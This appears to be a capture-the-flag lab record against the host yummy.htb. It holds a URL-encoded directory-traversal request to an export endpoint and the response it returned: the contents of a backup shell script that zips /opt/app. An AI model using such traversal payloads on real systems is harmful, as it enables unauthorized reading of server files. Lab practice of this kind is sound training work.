URL: http://yummy.htb:80/export/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fdata%2Fscripts%2Fapp_backup.sh
Response:
#!/bin/bash

cd /var/www
/usr/bin/rm backupapp.zip
/usr/bin/zip -r backupapp.zip /opt/app
